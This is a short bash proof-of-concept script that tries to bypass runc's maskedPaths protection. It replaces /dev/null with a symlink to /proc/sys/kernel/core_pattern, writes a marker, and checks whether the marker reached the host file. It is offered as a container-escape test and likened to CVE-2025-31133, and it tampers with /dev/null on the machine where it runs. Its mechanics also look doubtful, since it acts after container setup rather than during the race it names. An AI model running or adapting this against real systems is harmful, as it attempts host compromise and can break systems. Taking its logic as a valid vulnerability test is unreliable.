#!/bin/bash
#It symlinks /dev/null to a sensitive host file (or pseudo‑file) and attempts to write via /dev/null.
#If runc’s maskedPaths validation is weak / there’s a race, your “write” could end up in the real target (or at least show that /dev/null was not a real null device).
#This is very similar in concept to CVE‑2025‑31133. 
#Danger: messing with /dev/null can break a lot of things, so test in a safe environment.
# PoC: Test runc maskedPaths symlink race

# 1. Backup /dev/null if possible (dangerous)
if [ -e /dev/null ]; then
  mv /dev/null /tmp/null.backup 2>/dev/null
fi

# 2. Create a symlink from /dev/null to a target path we want to test
#    For example: /proc/sys/kernel/core_pattern
ln -s /proc/sys/kernel/core_pattern /dev/null

# 3. Try to write to masked path via runc behavior
#    For example, write a string that if echoed to core_pattern would indicate it's working.
echo "POC_ESC" > /dev/null 2>/dev/null

# 4. Read the target path to see if we succeeded
if grep -q "POC_ESC" /proc/sys/kernel/core_pattern 2>/dev/null; then
  echo "→ Vulnerable: maskedPaths may have been bypassed"
else
  echo "→ maskedPaths seems not bypassed (or this target is protected)"
fi

# 5. Clean up: restore /dev/null
rm /dev/null
if [ -e /tmp/null.backup ]; then
  mv /tmp/null.backup /dev/null
fi
